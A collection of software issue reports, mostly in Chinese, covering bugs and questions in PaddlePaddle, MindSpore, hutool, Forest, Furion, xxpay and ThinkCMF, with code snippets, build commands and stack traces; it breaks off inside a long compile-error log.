V2版本如何使用之前训练好的模型再进行训练,"在没有模型是以下这样获取参数的： 在有模型是以下这样获取参数的： 但是使用训练后的模型再训练的时候好像效果不好，之前明明是训练的很好的，只是中途停止了，想再继续训练。   <code>: parameters = paddle.parameters.create(cost) with open(parameters_path, 'r') as f: parameters = paddle.parameters.Parameters.from_tar(f)"
NumberUtil.generateRandomNumber边界问题,"JDK版本： jdk1.8.0_211 hutool版本： 5.5.9 从1-7之间生成不重复的7个随机数 报错   <code>: final int[] ints = NumberUtil.generateRandomNumber(1, 8, 7); Assert.assertEquals(7, ints.length); final Set&lt;?&gt; set = Convert.convert(Set.class, ints); Assert.assertEquals(7, set.size());"
"集群预测时报___fc_layer_0__.w0 missing, not allowed","集群产出训练模型后， 在本机上用单机预测，是通过的， 提交脚本为： 由于预测的数据量较大， 所以提交了一个集群预测任务， 提交脚本为： 一直报___fc_layer_0__.w0 missing, not allowed的错误， 但是我在模型产出目录中是能看到这个文件的   <code>: paddle train \ --job=test \ --config=trainer_config.py \ --use_gpu=false \ --config_args=is_predict=1 \ --init_model_path=""model/$1"" \ --predict_output_dir=""output/$1"" \ --trainer_count=1 paddle cluster_train \ --config=$SCRIPT_PATH/trainer_config_adagrad.conf \ --use_gpu=cpu \ --time_limit=10:00:00 \ --submitter=zhouzhiyong03 \ --num_nodes=10 \ --job_priority=normal \ --config_args=is_predict=1 \ --init_model_path=""模型到pass地址"" \ --trainer_count=4 \ --job_name=zhouzhiyong03_dnn_predict \ --where=mpi集群地址 \ --thirdparty=$SCRIPT_PATH/thirdparty"
paddle.distributed.fleet.distributed_model 文档问题,API: 文档版本信息： 问题：该 API 作用相当于 PyTorch 中的 还是 ? 细节：使用 模式进行开发时，已使用 对 和 包了一层。想确认模型是否也需要使用 再包一层？   <code>: paddle.distributed.fleet.distributed_model 2.0 torch.nn.parallel.DistributedDataParallel torch.nn.DataParallel fleet collective fleet.distributed_optimizer optimizer fleet.DistributedStrategy fleet.distributed_model
Remove sparse length limits,"Fix #268:demo/sentiment_analysis/ 这部分是没有翻译吧，我想认领翻译可以吗？ https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/math/SIMDFunctions.cpp#L80 Arbitrary length has already been supported, we only need to remove statement.   <code>: check"
"word模版用fe循环导出,图片不显示","3.1.0版本,fe命令对图片的支持还是不行(word导出) ---------------------------------------旧------------------------------------ 以下两种模版都尝试过,均无效果,都将图片对象以toString方式输出 后台代码 若果模版写成这样就能插入图片,如下所示   <code>: {{fe: entitylist t.CPBHA.no t.KD t.YS {{t.imageUrl}}}} {{fe: entitylist t.CPBHA.no t.KD t.YS t.imageUrl}} List&lt;Map&lt;String, Object&gt;&gt; entitylist = (List&lt;Map&lt;String, Object&gt;&gt;) JsonMapper.fromJsonString(key, List.class); for (Map&lt;String, Object&gt; map : entitylist) { String cpbh = (String) map.get(""CPBHA""); productSize = productSizeService.get(cpbh); if (productSize != null) { map.put(""CPBHA"", productSize); image = new ImageEntity(); image.setHeight(200); image.setWidth(150); // 获取项目中的图片路径 filePath = productSize.getPicture(); filePath = filePath.replaceAll(""/"", ""\\\\""); if(StringUtils.isNotEmpty(projectName)){ filePath = filePath.substring(filePath.indexOf(""\\"", 1), filePath.length()); } filePath = Encodes.urlDecode(srcPath + filePath); filePath = filePath.replaceAll(""\\\\"", ""/""); image.setUrl(filePath); image.setType(ImageEntity.URL); map.put(""imageUrl"", image); } } {{imageUrl}}"
generic.cmake needs to be able to refer to 3rd party packages,"For each target, CMake requires a call to to specify the to-be-linked libraries and a call to to specify the dependencies. An example is https://github.com/PaddlePaddle/Paddle/pull/2326/files#diff-7a3600c73304487a6d5f6bd3fa3fd662R41 It seems that we need a way to associate each 3rd-party dependency to its libraries. Currently, we specify a 3rd-party dependency, for example, , by calling in . For example, https://github.com/PaddlePaddle/Paddle/blob/develop/cmake/external/glog.cmake#L30. And we specify the libraries of this 3rd-party dependency by defining a variable, like in https://github.com/PaddlePaddle/Paddle/blob/develop/cmake/external/glog.cmake#L24. Could we rename to be in , and use the following directive to specify 3rd-party dependencies, where the definition of calls somethingl like to refer to defined in ?   <code>: target_link_libraries add_dependencies glog ExternalProject_Add cmake/external/*.cmake GLOG_LIBRARIES GLOG_LIBRARIES glog_libs cmake/external/glog.cmake cc_library(some_target SRCS some_source.cc DEPS some_paddle_deps 3RDS glog) cc_library ${cc_library_DEP}_libs glog_libs cmake/external/glog.cmake"
Forest对于一些错误的响应处理不友好,"Forest: 1.5.11 springboot starter Backend: okhttp 该问题是如何引起的？ forest客服端请求服务器，参数不完整时服务器返回了类似如下的信息 这个应该是springboot的原始返回，服务端给了提示，但是forest直接抛错误，也不打印该返回，这会导致forest客户端不知道具体的错误明细，增加错误排查的难度。 报错信息/完整请求日志（如果没有请求日志请把开关打开） 经过代码跟踪发现是forest自己拦击处理强行报错了。 接口定义（必要时请提供）   <code>: {""timestamp"":""2021-10-19T08:25:57.663+0000"",""status"":400,""error"":""Bad Request"",""message"":""Maven模板，构建操作(buildOpt)不能为空"",""path"":""/create""} com.dtflys.forest.exceptions.ForestNetworkException: HTTP 400 Error: at com.dtflys.forest.reflection.MethodLifeCycleHandler.handleError(MethodLifeCycleHandler.java:136) at com.dtflys.forest.reflection.MethodLifeCycleHandler.handleSyncWithException(MethodLifeCycleHandler.java:66) at com.dtflys.forest.reflection.MethodLifeCycleHandler.handleSync(MethodLifeCycleHandler.java:51) at com.dtflys.forest.backend.AbstractBackendResponseHandler.handleSync(AbstractBackendResponseHandler.java:39) at com.dtflys.forest.backend.okhttp3.response.OkHttp3ResponseHandler.handleSync(OkHttp3ResponseHandler.java:29) at com.dtflys.forest.backend.okhttp3.executor.AbstractOkHttp3Executor.retryOrDoError(AbstractOkHttp3Executor.java:299) at com.dtflys.forest.backend.okhttp3.executor.AbstractOkHttp3Executor.execute(AbstractOkHttp3Executor.java:276) at com.dtflys.forest.backend.okhttp3.executor.AbstractOkHttp3Executor.execute(AbstractOkHttp3Executor.java:307) at com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:3846) at com.dtflys.forest.http.ForestRequest.execute(ForestRequest.java:3880) at com.dtflys.forest.reflection.ForestMethod.invoke(ForestMethod.java:1396) at com.dtflys.forest.proxy.InterfaceProxyHandler.invoke(InterfaceProxyHandler.java:223) at com.sun.proxy.$Proxy123.createJob(Unknown Source)"
xxpay-service不可用时，xxpay-web的PayOrderController.validateParams会有异常,"xxpay-service不可用时，xxpay-web的PayOrderController.validateParams的215行，Jason解析会抛异常： 建议加上retStr的判断。   <code>: // 查询商户信息 JSONObject mchInfo; String retStr = mchInfoServiceClient.selectMchInfo(getJsonParam(""mchId"", mchId)); //xxpay-service不可用时， retStr是“error”，会导致底下语句抛异常 JSONObject retObj = JSON.parseObject(retStr)"
"[CT][MS][LITE] mindir ops convert to ms, ms predict fail","云侧导出的单算子mindir模型，端侧转换工具将其转换为ms模型并推理，预期精度达标，实际推理失败 / 硬件环境: /device CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): 设置环境变量 export LD_LIBRARY_PATH=/home/jenkins-slave/workspace/ME_Excutor_offline_infer_for_x86_Daily_EulerOS_CPU_OpenSource/mindspore-lite-1.8.0-linux-x64/tools/converter/lib/ 执行用例 ./mindir_test ms_310_predict ./data/ ./prototxt_mindir/Maximum_mindir.prototxt 备注： http://10.29.46.55:8001/ci_project/?keyword=ME_Excutor_offline_infer_for_x86_Daily_EulerOS_CPU_OpenSource&amp;build_id=97 预期推理成功，精度达标 实际推理失败，具体失败日志如下：   <code>: test_cpu_lite_mindir_infer_Maximum_mindir test_cpu_lite_mindir_infer_Normal_mindir test_cpu_lite_mindir_infer_SparseToDense_mindir test_cpu_lite_mindir_infer_StandardNormal_mindir #test_cpu_lite_mindir_infer_Maximum_mindir [common.cpp] Loading data from: ./data/ops/Maximum.mindir [common.cpp]Read Binary Data Over, get tensorSize as: 564 INFO [mindspore/lite/src/runtime/lite_model.cc:519] ImportFromBuffer] import model from lite model INFO [mindspore/lite/src/runtime/lite_model.cc:366] GenerateModelByVersion] MindSpore Lite inference version: MindSpore Lite 1.8.0 ERROR [mindspore/lite/src/runtime/cxx_api/model/model_impl.cc:304] Predict] Tensor right_input has wrong data size. predict failed. ((ret)==(kSuccess))Expectation Failed Testcase Name: ms_310_predict File: /home/jenkins-slave/workspace/ME_Excutor_offline_infer_for_x86_Daily_EulerOS_CPU_OpenSource/MindSporeTest/offline_infer/infer/test.cpp Line:1901 Default/Maximum-op0 : 43 Default/Maximum-op0 : 4 NO.0 output #test_cpu_lite_mindir_infer_Normal_mindir [common.cpp] Loading data from: ./data/ops/Normal.mindir [common.cpp]Read Binary Data Over, get tensorSize as: 944 INFO [mindspore/lite/src/runtime/lite_model.cc:519] ImportFromBuffer] import model from lite model ERROR [mindspore/lite/src/runtime/lite_model.h:261] GenerateModel] meta_graph is invalid, please check your model file. INFO [mindspore/lite/src/runtime/lite_model.cc:366] GenerateModelByVersion] MindSpore Lite inference version: MindSpore Lite 1.8.0 ERROR [mindspore/lite/src/runtime/lite_model.cc:413] ConstructModel] fail to generate model ERROR [mindspore/lite/src/runtime/lite_model.cc:527] ImportFromBuffer] construct model failed. ERROR [mindspore/lite/src/runtime/cxx_api/serialization.cc:74] Load] New model failed. ERROR [mindspore/lite/src/runtime/cxx_api/model/model_impl.cc:123] Build] Invalid graph. #test_cpu_lite_mindir_infer_SparseToDense_mindir INFO [mindspore/lite/src/runtime/lite_model.cc:519] ImportFromBuffer] import model from lite model INFO [mindspore/lite/src/runtime/lite_model.cc:366] GenerateModelByVersion] MindSpore Lite inference version: MindSpore Lite 1.8.0 ERROR [mindspore/lite/src/runtime/scheduler.cc:888] InferSubGraphShape] InferShape failed, name: Default/sparse_to_dense-SparseToDense/SparseToDense-op0, type: SparseToDense ERROR [mindspore/lite/src/runtime/scheduler.cc:262] SchedulePreProcess] op infer shape failed. ERROR [mindspore/lite/src/runtime/lite_session.cc:546] CompileGraph] Schedule kernels failed: -500 ERROR [mindspore/lite/src/runtime/cxx_api/model/model_impl.cc:167] Build] Build model failed. #test_cpu_lite_mindir_infer_StandardNormal_mindir [common.cpp] Loading data from: ./data/ops/StandardNormal.mindir [common.cpp]Read Binary Data Over, get tensorSize as: 512 INFO [mindspore/lite/src/runtime/lite_model.cc:519] ImportFromBuffer] import model from lite model ERROR [mindspore/lite/src/runtime/lite_model.h:261] GenerateModel] meta_graph is invalid, please check your model file. INFO [mindspore/lite/src/runtime/lite_model.cc:366] GenerateModelByVersion] MindSpore Lite inference version: MindSpore Lite 1.8.0 ERROR [mindspore/lite/src/runtime/lite_model.cc:413] ConstructModel] fail to generate model ERROR [mindspore/lite/src/runtime/lite_model.cc:527] ImportFromBuffer] construct model failed. ERROR [mindspore/lite/src/runtime/cxx_api/serialization.cc:74] Load] New model failed. ERROR [mindspore/lite/src/runtime/cxx_api/model/model_impl.cc:123] Build] Invalid graph."
Add type `Reader` for `VarDesc`,"Add a new type for , which can hold more than one LoDTensor. fixes #8113:Fix equation in doc of fluid.layers.fc   <code>: Reader VarDesc"
在GPU有其它进程存在时分配空间报错,"环境： paddle版本：paddlepaddle-gpu (0.15.0.post87) CUDA版本：cuda_8.0 cudnn版本：v7 系统：ubuntu：14.04 用的代码就是官网demo，train函数中CPUPlace()改成了CUDAPlale(0) 这段代码在CPU模式下式可以正确运行的，但是在GPU模式下会提示显存空间不足。如下图： 请问这种情况如何解决？可否像tf一样指定per_process_gpu_memory_fraction一样指定使用一部分GPU？   <code>: # Include libraries. import paddle import paddle.fluid as fluid import numpy # Configure the neural network. def net(x, y): y_predict = fluid.layers.fc(input=x, size=1, act=None) cost = fluid.layers.square_error_cost(input=y_predict, label=y) avg_cost = fluid.layers.mean(cost) return y_predict, avg_cost # Define train function. def train(save_dirname): x = fluid.layers.data(name='x', shape=[13], dtype='float32') y = fluid.layers.data(name='y', shape=[1], dtype='float32') y_predict, avg_cost = net(x, y) sgd_optimizer = fluid.optimizer.SGD(learning_rate=0.001) sgd_optimizer.minimize(avg_cost) train_reader = paddle.batch( paddle.reader.shuffle(paddle.dataset.uci_housing.train(), buf_size=500), batch_size=20) place = fluid.CUDAPlace(0) exe = fluid.Executor(place) def train_loop(main_program): feeder = fluid.DataFeeder(place=place, feed_list=[x, y]) exe.run(fluid.default_startup_program()) PASS_NUM = 1000 for pass_id in range(PASS_NUM): total_loss_pass = 0 for data in train_reader(): avg_loss_value, = exe.run( main_program, feed=feeder.feed(data), fetch_list=[avg_cost]) total_loss_pass += avg_loss_value if avg_loss_value &lt; 5.0: if save_dirname is not None: fluid.io.save_inference_model( save_dirname, ['x'], [y_predict], exe) return print(""Pass %d, total avg cost = %f"" % (pass_id, total_loss_pass)) train_loop(fluid.default_main_program()) # Infer by using provided test data. def infer(save_dirname=None): place = fluid.CUDAPlace(0) exe = fluid.Executor(place) inference_scope = fluid.core.Scope() with fluid.scope_guard(inference_scope): [inference_program, feed_target_names, fetch_targets] = ( fluid.io.load_inference_model(save_dirname, exe)) test_reader = paddle.batch(paddle.dataset.uci_housing.test(), batch_size=20) test_data = test_reader().next() test_feat = numpy.array(map(lambda x: x[0], test_data)).astype(""float32"") test_label = numpy.array(map(lambda x: x[1], test_data)).astype(""float32"") results = exe.run(inference_program, feed={feed_target_names[0]: numpy.array(test_feat)}, fetch_list=fetch_targets) print(""infer results: "", results[0]) print(""ground truth: "", test_label) # Run train and infer. if __name__ == ""__main__"": save_dirname = ""fit_a_line.inference.model"" train(save_dirname) # infer(save_dirname)"
The  'decoder_boot' in test_rnn_encoder_decoder.py is not right.,https://github.com/PaddlePaddle/Paddle/blob/develop/python/paddle/v2/fluid/tests/book/test_rnn_encoder_decoder.py#L127 The input of the fc layer should be the instead of .   <code>: src_backward_first encoded_vector
thinkcmf-6.0.7的RestBaseController.php是不是有token永不过期Bug？？？,"\vendor\thinkcmf\cmf\src\controller\RestBaseController.php private function _initUser() 方法里 并没有判断token过期。等于，只要登录，用这个token可以一直被当成处于有效登录状态？ 是不是啊？   <code>: $this-&gt;token = $token; $user = UserTokenModel::alias('a') -&gt;field('b.*') -&gt;where(['token' =&gt; $token, 'device_type' =&gt; $deviceType]) -&gt;join('user b', 'a.user_id = b.id') -&gt;find(); if (!empty($user)) { $this-&gt;user = $user; $this-&gt;userId = $user['id']; $this-&gt;userType = $user['user_type']; }"
Worker Service 项目发布后不能自动注册 Worker类 services.AddHostedService<Worker>(),"Furion 版本号 2.11.6 Web 项目类型 Worker Service 项目 Worker Service 项目 在vs2019 发布后运行,不能自动注册 Worker类 (services.AddHostedService()),   <code>: foreach (var type in backgroundServiceTypes) { addHostServiceMethod.MakeGenericMethod(type).Invoke(null, new object[] { services }); } return services; }"
假删除指向异常,"Furion 版本号 最新 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 实体实现了抽象类 Entity，假删除出现异常 InvokeFilterPipelineAsync &gt; Next &gt; OnExceptionAsync &gt; Start &gt; Start &gt; MoveNext &gt; PrintToMiniProfiler &gt; PrintToMiniProfiler System.NullReferenceException: Object reference not set to an instance of an object. at xxx类 (Guid id) in xxxService.cs:line 237 at lambda_method64(Closure , Object ) at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.AwaitableResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Logged|12_1(ControllerActionInvoker invoker) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.InvokeInnerFilterAsync() --- End of stack trace from previous location --- at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Awaited|25_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) 代码或代码仓库 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 能正常进行操作 补充 Guid id Repository.FakeDelete(id); SELECT ., ., ., ., ., ., ., ., . FROM AS WHERE . = ddd8e255-7d58-11eb-bb7b-0242ac1e000b LIMIT 1 类如下 XXXRecord: Entity 实际产生的原因是 id条件问题，. =   <code>: var entity = Repository.AsQueryable().FirstOrDefault(p =&gt; p.Id == id); await Repository.FakeDeleteAsync(entity); p Id p x p CreatedTime p x p IsDeleted p x p x p x p UpdatedTime XXXRecord p p Id p Id ddd8e255-7d58-11eb-bb7b-0242ac1e000b"
Reduce op compile slowly,"为了支持对多个dims做reduce, 使用了大量的eigen template function, 因此导致编译变慢。 需要讨论下是否可以减少reduce支持的dims？ 是否有更优的替代方案？ 用上述命令，编译时间如下： 删去L138-L146后编译时间如下： 删去L138-L146 和 L290-L293后，编译时间如下：   <code>: reduce op reduce op CXX_FLAGS=""-m64 -std=c++11 -O3 -g -DNDEBUG --expt-relaxed-constexpr"" CXX_DEFINES=""-DANY_IMPL_ANY_CAST_MOVEABLE -DPADDLE_DISABLE_PROFILER -DPADDLE_DISABLE_RDMA -DPADDLE_DISABLE_TIMER -DPADDLE_USE_DSO -DPADDLE_USE_PTHREAD_BARRIER -DPADDLE_USE_PTHREAD_SPINLOCK -DPADDLE_VERSION=0.12.0 -DPADDLE_WITHOUT_GOLANG -DPADDLE_WITH_CUDA -DPADDLE_WITH_CUPTI"" CXX_INCLUDES=""..."" time nvcc /home/disk1/wanghaoshuang/paddle/debug/paddle/fluid/operators/reduce_op.cu -c -o /home/disk1/wanghaoshuang/paddle/debug/build/paddle/fluid/operators/CMakeFiles/reduce_op.dir/reduce_op_generated_reduce_op.cu.o -ccbin /home/work/.jumbo/opt/gcc48/bin/g++ $CXX_FLAGS $CXX_DEFINES $CXX_INCLUDES real 5m49.639s user 5m38.698s sys 0m11.201s real 2m23.974s user 2m16.771s sys 0m7.076s real 0m39.780s user 0m35.981s sys 0m3.745s"
[ST][MS][NET][bert][gpu 1p/8p]OPS Compile error,"bert/deepspeech/lstm/transformer/ocean_model/deeptext等网络在GPU环境训练报算子编译失败 / 硬件环境: /device GPU : -- MindSpore version :r2.0 commit_id:c1b80e30ff -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:HiAI/HISI_C83/20221017 MindSpore 版本：编译时间20221026121556 r2.0 commit_id:c1b80e30ff (/): /mode graph test_ms_usability_benchmark_graph_gpu_bert_time_perf_loss_1p_0001.py test_ms_usability_benchmark_graph_gpu_deepspeechhh_time_perf_loss_1p_0001.py test_ms_usability_benchmark_graph_gpu_transformer_time_perf_loss_1p_0001.py cd solution_test/cases/02network/02nlp/bert/pynative pytest -s test_ms_usability_benchmark_graph_gpu_bert_time_perf_loss_1p_0001.py 网络训练成功 走给陈德仕   <code>: Traceback (most recent call last): File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_akg/akg/ms/message.py"", line 161, in _compilewithjson_to_module composite.build(kernel_info, attrs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_akg/akg/composite/build_module.py"", line 636, in build return _build_to_module(desc_s, desc_d, attrs, poly) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_akg/akg/composite/build_module.py"", line 464, in _build_to_module return func(process, poly, segment_tree, segment_infos) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_akg/akg/tvm/_ffi/_ctypes/function.py"", line 207, in __call__ raise get_last_ffi_error() tvm._ffi.base.TVMError: Traceback (most recent call last): [bt] (8) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::lower::LowerNodeDecorator::Lower(akg::lower::StageType)+0x4b) [0x7faa57b8d19b] [bt] (7) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(+0x10f368f) [0x7faa57bba68f] [bt] (6) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::lower::JsonLowerLeaf::Lower(akg::lower::StageType)+0x51) [0x7faa57bad521] [bt] (5) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::lower::JsonLowerLeaf::GenBuildInfo(air::Map&lt;std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;, air::NodeRef, void, void&gt;&amp;)+0x7e) [0x7faa57bacf7e] [bt] (4) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::ExtractBuildInfo(picojson::value const&amp;, akg::BuildInfo&amp;)+0x34c) [0x7faa57b887dc] [bt] (3) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::Emitter::Visit_(air::ir::AttrStmt const*)+0x39d) [0x7faa57b6e0ed] [bt] (2) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::Emitter::Visit_(air::ir::Provide const*)+0xf0) [0x7faa57b6ca60] [bt] (1) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(akg::Emitter::EmitTopi(air::ir::Provide const*, air::Array&lt;air::NodeRef, void&gt; const&amp;)+0x146) [0x7faa57b6b1c6] [bt] (0) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(+0x1cd6b8b) [0x7faa5879db8b] File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_akg/akg/tvm/_ffi/_ctypes/function.py"", line 72, in cfun rv = local_pyfunc(*pyargs) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_akg/akg/composite/topi.py"", line 181, in StridedSlice begin = list(attrs[""begin""]) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_akg/akg/tvm/container.py"", line 76, in __getitem__ return _api_internal._MapGetItem(self, k) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_akg/akg/tvm/_ffi/_ctypes/function.py"", line 207, in __call__ raise get_last_ffi_error() [bt] (3) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(TVMFuncCall+0x5b) [0x7faa5879e4fb] [bt] (2) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(+0x19744d4) [0x7faa5843b4d4] [bt] (1) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(+0x197426c) [0x7faa5843b26c] [bt] (0) /home/jenkins0/.local/lib/python3.7/site-packages/mindspore/lib/libakg.so(dmlc::LogMessageFatal::~LogMessageFatal()+0x5c) [0x7faa57a9af5c] File ""/home/jenkins/agent-working-dir/workspace/Compile_GPU_X86_CentOS_Cuda11/mindspore/akg/third_party/incubator-tvm/src/api/api_lang.cc"", line 163 TVMError: Check failed: it != n-&gt;data.end(): cannot find the corresponding key in the Map multiprocessing.pool.RemoteTraceback: """""" Traceback (most recent call last): File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/pool.py"", line 121, in worker result = (True, func(*args, **kwds)) File ""/home/miniconda3/envs/ci/lib/python3.7/multiprocessing/pool.py"", line 47, in starmapstar return list(itertools.starmap(args[0], args[1])) File ""/home/jenkins0/.local/lib/python3.7/site-packages/mindspore/_extends/parallel_compile/akg_compiler/akg_process.py"", line 42, in _compile_akg_task_default raise ValueError(""Compile error, args: {}! build attrs: {}"".format(json_str, attrs)) ValueError: Compile error, args: {""composite"":true,""composite_graph"":""3242.6201"",""id"":0,""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_1""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_2""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_7""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_8""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""input_9""}],[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[128,1024],""tensor_name"":""input_3""}],[{""data_type"":""int64"",""format"":""DefaultFormat"",""shape"":[2],""tensor_name"":""input_4""}],[{""data_type"":""int64"",""format"":""DefaultFormat"",""shape"":[2],""tensor_name"":""input_5""}],[{""data_type"":""int64"",""format"":""DefaultFormat"",""shape"":[2],""tensor_name"":""input_6""}]],""op"":""Fused_BroadcastTo_inplace_assign_builder_Cast_split_Cast_split_StridedSlice_f_more_parallel_10312741098740888620"",""op_desc"":[{""attr"":[{""data_type"":""listInt"",""name"":""shape"",""value"":[4096]}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[1],""tensor_name"":""input_0"",""value"":0.0}]],""name"":""BroadcastTo"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[4096],""tensor_name"":""output_0_0""}]},{""attr"":[{""data_type"":""bool"",""name"":""is_backed_cast"",""value"":false},{""data_type"":""str"",""name"":""SrcT"",""value"":""float32""},{""data_type"":""str"",""name"":""DstT"",""value"":""float16""},{""data_type"":""str"",""name"":""dst_type"",""value"":""float16""}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[1024],""tensor_name"":""input_1""}]],""name"":""Cast"",""output_desc"":[{""data_type"":""float16"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[1024],""tensor_name"":""output_0_1""}]},{""attr"":[{""data_type"":""bool"",""name"":""is_backed_cast"",""value"":false},{""data_type"":""str"",""name"":""SrcT"",""value"":""float32""},{""data_type"":""str"",""name"":""DstT"",""value"":""float16""},{""data_type"":""str"",""name"":""dst_type"",""value"":""float16""}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[1024],""tensor_name"":""input_2""}]],""name"":""Cast"",""output_desc"":[{""data_type"":""float16"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[1024],""tensor_name"":""output_0_2""}]},{""attr"":[{""data_type"":""int"",""name"":""new_axis_mask"",""value"":0},{""data_type"":""int"",""name"":""shrink_axis_mask"",""value"":0},{""data_type"":""int"",""name"":""end_mask"",""value"":2},{""data_type"":""int"",""name"":""begin_mask"",""value"":2},{""data_type"":""int"",""name"":""ellipsis_mask"",""value"":0}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[128,1024],""tensor_name"":""input_3""}],[{""data_type"":""int64"",""format"":""DefaultFormat"",""name"":""input_1"",""shape"":[2],""tensor_name"":""input_4""}],[{""data_type"":""int64"",""format"":""DefaultFormat"",""name"":""input_2"",""shape"":[2],""tensor_name"":""input_5""}],[{""data_type"":""int64"",""format"":""DefaultFormat"",""name"":""input_3"",""shape"":[2],""tensor_name"":""input_6""}]],""name"":""StridedSlice"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[128,1024],""tensor_name"":""output_0_3""}]},{""attr"":[{""data_type"":""bool"",""name"":""is_backed_cast"",""value"":false},{""data_type"":""str"",""name"":""SrcT"",""value"":""float32""},{""data_type"":""str"",""name"":""DstT"",""value"":""float16""},{""data_type"":""str"",""name"":""dst_type"",""value"":""float16""}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[1024],""tensor_name"":""input_7""}]],""name"":""Cast"",""output_desc"":[{""data_type"":""float16"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[1024],""tensor_name"":""output_0_4""}]},{""attr"":[{""data_type"":""bool"",""name"":""is_backed_cast"",""value"":false},{""data_type"":""str"",""name"":""SrcT"",""value"":""float32""},{""data_type"":""str"",""name"":""DstT"",""value"":""float16""},{""data_type"":""str"",""name"":""dst_type"",""value"":""float16""}],""impl_path"":"""",""input_desc"": [[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[1024],""tensor_name"":""input_8""}]],""name"":""Cast"",""output_desc"":[{""data_type"":""float16"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[1024],""tensor_name"":""output_0_5""}]},{""attr"":[{""data_type"":""bool"",""name"":""is_backed_cast"",""value"":false},{""data_type"":""str"",""name"":""SrcT"",""value"":""float32""},{""data_type"":""str"",""name"":""DstT"",""value"":""float16""},{""data_type"":""str"",""name"":""parallel_fusion_type"",""value"":""block_fusion""},{""data_type"":""str"",""name"":""dst_type"",""value"":""float16""}],""impl_path"":"""",""input_desc"":[[{""data_type"":""float32"",""format"":""DefaultFormat"",""name"":""input_0"",""shape"":[1024],""tensor_name"":""input_9""}]],""name"":""Cast"",""output_desc"":[{""data_type"":""float16"",""format"":""DefaultFormat"",""name"":""output_0"",""shape"":[1024],""tensor_name"":""output_0_6""}]}],""op_full_name"":""Fused_BroadcastTo_inplace_assign_builder_Cast_split_Cast_split_StridedSlice_fusion_Cast_split_Cast_split_Cast_split_parallel"",""output_desc"":[{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[4096],""tensor_name"":""output_0_0""},{""data_type"":""float16"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""output_0_1""},{""data_type"":""float16"",""format"":""DefaultFormat"",""shape"":[1024],""tensor_name"":""output_0_2""},{""data_type"":""float32"",""format"":""DefaultFormat"",""shape"":[128,1024],""tensor_name"":""output_0_3""},{""data_t